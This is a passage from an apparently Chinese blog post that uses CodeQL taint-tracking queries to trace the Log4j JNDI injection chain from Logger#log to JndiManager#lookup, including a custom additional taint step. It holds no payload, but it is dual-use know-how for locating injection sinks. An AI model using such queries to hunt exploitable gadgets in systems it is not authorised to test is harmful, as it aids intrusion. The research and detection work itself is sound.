main<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">,</span> logshell <span class="token punctuation">(</span>com<span class="token punctuation">.</span>yxxx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="find-sink"><a href="#find-sink" class="headerlink" title="find sink"></a>find sink</h3><h4 id="CWE-074"><a href="#CWE-074" class="headerlink" title="CWE-074"></a>CWE-074</h4><p><code>CWE-074</code>规则之前一直处于试验状态，现在转正过了试用期，变成正式的规则了。</p>
<p>存在于<code>java\ql\src\Security\CWE\CWE-074\JndiInjection.ql</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/**
 * @name JNDI lookup with user-controlled name
 * @description Performing a JNDI lookup with a user-controlled name can lead to the download of an untrusted
 *              object and to execution of arbitrary code.
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.8
 * @precision high
 * @id java/jndi-injection
 * @tags security
 *       external/cwe/cwe-074
 */</span>

<span class="token keyword">import</span> java
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>JndiInjectionQuery
<span class="token keyword">import</span> DataFlow::PathGraph

<span class="token keyword">from</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink<span class="token punctuation">,</span> JndiInjectionFlowConfig conf
<span class="token keyword">where</span> conf<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>
<span class="token keyword">select</span> sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"JNDI lookup might include name from $@."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">"this user input"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>据说<code>log4j</code>的sink就是<code>CWE-074</code>扫出来的。我们观察一下他的源码：</p>
<p>这里使用了定义的<code>source</code>和<code>sink</code>，导入<code>DataFlow::PathNode</code>来检查数据流。<code>source</code>和<code>sink</code>的定义在<code>JndiInjectionFlowConfig</code>中，我们进入查看：</p>
<p><code>java\ql\lib\semmle\code\java\security\JndiInjectionQuery.qll</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class JndiInjectionFlowConfig extends TaintTracking::Configuration {
  JndiInjectionFlowConfig<span class="token punctuation">(</span><span class="token punctuation">)</span> { this <span class="token operator">=</span> <span class="token string">"JndiInjectionFlowConfig"</span> }

  override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> { source instanceof RemoteFlowSource }

  override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> { sink instanceof JndiInjectionSink }

  override predicate isSanitizer<span class="token punctuation">(</span>DataFlow::Node node<span class="token punctuation">)</span> {
    node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof PrimitiveType <span class="token operator">or</span> node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof BoxedType
  }
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先关注漏洞触发点的定义<code>isSink</code>，使用的是<code>JndiInjectionSink</code>，继续跟入：</p>
<p><code>java\ql\lib\semmle\code\java\security\JndiInjection.qll</code></p>
<p>在此处定义了可以导致jndi注入的相关类及其可触发漏洞的方法</p>
<p><img src="https://s2.loli.net/2022/07/11/pTYFHjktGrLSJws.png" alt="image-20220620162913850"></p>
<p>看起来还是比较全面的。我们回去测一下<code>isSink</code>看能不能找到<code>log4j</code>漏洞的<code>sink</code></p>
<p><img src="https://s2.loli.net/2022/07/11/Pyajg8UBxwhcEGH.png" alt="image-20220620163256712"></p>
<p>成功定位到<code>org.apache.logging.log4j.core.net.JndiManager#lookup</code></p>
<h4 id="自建脚本寻找"><a href="#自建脚本寻找" class="headerlink" title="自建脚本寻找"></a>自建脚本寻找</h4><p>如果我们自己写规则去寻找能触发jndi注入的<code>sink</code>点呢？</p>
<p>这里有个项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.dev/SummerSec/LookupInterface">https://github.dev/SummerSec/LookupInterface</a></p>
<p>此项目中同样定义了很全的JNDI注入查询规则。我们可以copy下来进行实现：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java
class Context extends  RefType{
    Context<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"InitialContext"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span> 
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiTemplate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiLocatorDelegate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.shiro.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiLocatorDelegate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiTemplate"</span><span class="token punctuation">)</span>
    }
}

<span class="token keyword">from</span> <span class="token keyword">Call</span> <span class="token keyword">call</span><span class="token punctuation">,</span>Callable parseExpression
<span class="token keyword">where</span>
    <span class="token keyword">call</span><span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> parseExpression <span class="token operator">and</span>
    parseExpression<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Context <span class="token operator">and</span>
    parseExpression<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token keyword">call</span><span class="token punctuation">,</span> parseExpression<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此处ql语句很好理解就不多赘述了。结果也是成功定位到<code>lookup</code>：</p>
<p><img src="https://s2.loli.net/2022/07/11/nU3pjhsP5m4VoaG.png" alt="image-20220620165014094"></p>
<p><code>find sink</code>的过程相对简单，难点是向上寻找<code>source</code>触发和使用<code>gadget</code>连接<code>sink</code>和<code>source</code>。</p>
<h3 id="search-gadget"><a href="#search-gadget" class="headerlink" title="search gadget"></a>search gadget</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/**
 *@name Tainttrack Context lookup
 *@kind path-problem
 */</span>
<span class="token keyword">import</span> java
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources
<span class="token keyword">import</span> DataFlow::PathGraph
class Context extends  RefType{
    Context<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"InitialContext"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span> 
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiTemplate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiLocatorDelegate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.shiro.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiLocatorDelegate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiTemplate"</span><span class="token punctuation">)</span>
    }
}
class Logger extends  RefType{
    Logger<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.spi"</span><span class="token punctuation">,</span> <span class="token string">"AbstractLogger"</span><span class="token punctuation">)</span>
    }
}
class LoggerInput extends  Method {
    LoggerInput<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Logger <span class="token operator">and</span>
        this<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token operator">and</span> this<span class="token punctuation">.</span>getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
    }
    Parameter getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> }
}
predicate isLookup<span class="token punctuation">(</span>Expr arg<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span>
        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"lookup"</span>
        <span class="token operator">and</span>
        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Context
        <span class="token operator">and</span>
        arg <span class="token operator">=</span> ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
}

class TainttrackLookup  extends TaintTracking::Configuration {
    TainttrackLookup<span class="token punctuation">(</span><span class="token punctuation">)</span> { 
        this <span class="token operator">=</span> <span class="token string">"TainttrackLookup"</span> 
    }

    override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>
            LoggerInput loggermethod <span class="token operator">|</span> 
            source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> loggermethod<span class="token punctuation">.</span>getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
    }

    override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>Expr arg <span class="token operator">|</span>
            isLookup<span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
            <span class="token operator">and</span>
            sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> arg
        <span class="token punctuation">)</span>
    }
} 
<span class="token keyword">from</span> TainttrackLookup config <span class="token punctuation">,</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink
<span class="token keyword">where</span>
    config<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>
<span class="token keyword">select</span> sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"unsafe lookup"</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this is user input"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在上面的ql查询语句中，我们使用了标准的污点分析结构。定义<code>TainttrackLookup</code>继承<code>TaintTracking::Configuration</code>，并且在其中定义<code>isSource</code>和<code>isSink</code>，在查询语句中将<code>TainttrackLookup</code>实例化为<code>config</code>，定义数据流<code>DataFlow::PathNode source</code>和<code>DataFlow::PathNode sink</code>，使用<code>config.hasFlowPath(source, sink)</code>进行污点追踪，查询数据流是否可以从<code>sink</code>到<code>source</code>。结果：</p>
<p><img src="https://s2.loli.net/2022/07/11/cAdlHU3iozCgrLM.png" alt="image-20220621142035627"></p>
<h3 id="人工排查"><a href="#人工排查" class="headerlink" title="人工排查"></a>人工排查</h3><p>这里获得了四个Path，其中三个都走到了<code>java\org\apache\logging\log4j\core\Logger.java</code></p>
<p><img src="https://s2.loli.net/2022/07/11/Xdbq6t1hJncOU3G.png" alt="image-20220622102329069"></p>
<p>codeql选择了<code>java\org\apache\logging\log4j\core\Logger.java</code>中对<code>filter</code>方法的调用来构造gadget。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Level</span> level<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Marker</span> marker<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Message</span> msg<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">final</span> <span class="token class-name">Filter</span> filter <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>filter <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Filter<span class="token punctuation">.</span>Result</span> r <span class="token operator">=</span> filter<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>logger<span class="token punctuation">,</span> level<span class="token punctuation">,</span> marker<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token class-name">Filter<span class="token punctuation">.</span>Result</span><span class="token punctuation">.</span>NEUTRAL<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> r <span class="token operator">==</span> <span class="token class-name">Filter<span class="token punctuation">.</span>Result</span><span class="token punctuation">.</span>ACCEPT<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> level <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> intLevel <span class="token operator">&gt;=</span> level<span class="token punctuation">.</span><span class="token function">intLevel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里就能体现出静态代码分析的缺陷：对于相对复杂的项目进行分析时，关于条件判断后的代码是否可以进入判断不准确。这里挂一张南京大学《软件分析》课程的ppt（来一起卷<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1b7411K7P4%EF%BC%89%EF%BC%8C%E5%AF%B9%E4%BA%8E%E7%8E%B0%E9%98%B6%E6%AE%B5%E7%9A%84codeql%E6%9D%A5%E8%AF%B4%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B8%8C%E6%9C%9B%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E7%9A%84%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E7%BB%93%E6%9E%9C%E5%8C%85%E5%90%AB%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E7%9A%84truth%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%89%8D%E6%8F%90%E4%B8%8B%E5%B0%BD%E5%8F%AF%E8%83%BD%E7%BC%A9%E5%B0%8F%E7%BB%93%E6%9E%9C%E9%9B%86%E5%90%88%EF%BC%8C%E5%87%8F%E8%BD%BB%E4%BA%BA%E5%B7%A5%E6%8E%92%E6%9F%A5%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%90%E6%9C%AC%E3%80%82">https://www.bilibili.com/video/BV1b7411K7P4），对于现阶段的codeql来说，我们希望自己编写的污点分析查询语句中的结果包含我们想要的truth，在这个前提下尽可能缩小结果集合，减轻人工排查的时间成本。</a></p>
<p><img src="https://s2.loli.net/2022/07/11/mUI6K7yBc21OTkp.png" alt="image-20220622105238705"></p>
<p>回到vscode中，这个<code>filter</code>想要进入需要满足<code>Filter</code>为<code>RegexFilter</code>。因为我们的目的是寻找完整的log4j调用链，先不去想如何满足这个已知与log4j漏洞无关的条件。于是我们去查看仅剩的那条链：</p>
<p><img src="https://s2.loli.net/2022/07/11/Neouk7Svw8xQAir.png" alt="image-20220622111111913"></p>
<p>可以看到，从<code>source</code>开始直到<code>java\org\apache\logging\log4j\spi\AbstractLogger.java#tryLogMessage</code>都是准确的调用链，但是在调用log方法的时候出现了跑偏，走到了<code>AbstractLogger#log</code>。实际动手调过<code>log4j</code>漏洞的uu们肯定会记得，这里实际上是走到了<code>Logger#log</code>。这两个类之间一看就是继承关系。想解决这个问题我们可以改一下ql查询语句，将<code>source</code>设定为<code>Logger#log</code></p>
<p>修改一下<code>LoggerInput</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class Logger2 extends RefType {
    Logger2<span class="token punctuation">(</span><span class="token punctuation">)</span> {
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core"</span><span class="token punctuation">,</span> <span class="token string">"Logger"</span><span class="token punctuation">)</span>
    }
}
class LoggerInput extends  Method {
    LoggerInput<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Logger2 <span class="token operator">and</span>
        this<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>
    }
    Parameter getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查询结果中也是有很多path，我们看一下和log4j调用链匹配度最高的：</p>
<p><img src="https://s2.loli.net/2022/07/11/iEYhq7olmdfJNsu.png" alt="image-20220622155227724"></p>
<p>此时的codeql已经能分析到<code>createEvent</code>方法。但是继续分析得到的利用链就出现了问题。没有分析成功。在<code>createEvent</code>方法中，message参数对应的是<code>logEvent</code>，在对<code>logEvent</code>进行处理时触发漏洞。我们猜测，codeql并没有将返回的<code>logEvent</code>作为污点继续分析，所以进行手动连接：</p>
<h3 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h3><p><img src="https://s2.loli.net/2022/07/11/Mh1KS3rugTwUR8Z.png" alt="image-20220622161132765"></p>
<p>当我们需要将某个污点传递到指定位置从而构造更准确的gadget时，可以override谓词<code>isAdditionalTaintStep</code>来实现。</p>
<p>分析一下现在的情况：我们需要将<code>ReusableLogEventFactory#createEvent</code>的第六个参数<code>Message</code>和<code>LoggerConfig#log</code>第一个参数<code>logEvent</code>连接起来。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isAdditionalTaintStep<span class="token punctuation">(</span>DataFlow::Node fromNode<span class="token punctuation">,</span> DataFlow::Node toNode<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma<span class="token punctuation">,</span>MethodAccess ma2 <span class="token operator">|</span>
           
        <span class="token comment">//set fromNode</span>
        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.impl"</span><span class="token punctuation">,</span> <span class="token string">"ReusableLogEventFactory"</span><span class="token punctuation">)</span> 
        <span class="token operator">and</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"createEvent"</span><span class="token punctuation">)</span> 
        <span class="token operator">and</span> fromNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> 
           
        <span class="token comment">//set toNode</span>
        <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.config"</span><span class="token punctuation">,</span> <span class="token string">"LoggerConfig"</span><span class="token punctuation">)</span>  
        <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span> 
        <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"logEvent"</span>
        <span class="token operator">and</span> toNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>快速查询可以看到我们的<code>fromNode</code>和<code>toNode</code>设置的没有问题</p>
<p><img src="https://s2.loli.net/2022/07/11/8zEjmkXhv1qdUKT.png" alt="image-20220623155307405"></p>
<h3 id="最后结果"><a href="#最后结果" class="headerlink" title="最后结果"></a>最后结果</h3><p>完整ql查询语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/**
 *@name Tainttrack Context lookup
 *@kind path-problem
 */</span>
<span class="token keyword">import</span> java
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources
<span class="token keyword">import</span> DataFlow::PathGraph
class Context extends  RefType{
    Context<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"InitialContext"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span> 
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiTemplate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiLocatorDelegate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.shiro.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiCallback"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiLocatorDelegate"</span><span class="token punctuation">)</span>
        <span class="token operator">or</span>
        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiTemplate"</span><span class="token punctuation">)</span>
    }
}
class Logger extends  RefType{
    Logger<span class="token punctuation">(</span><span class="token punctuation">)</span>{
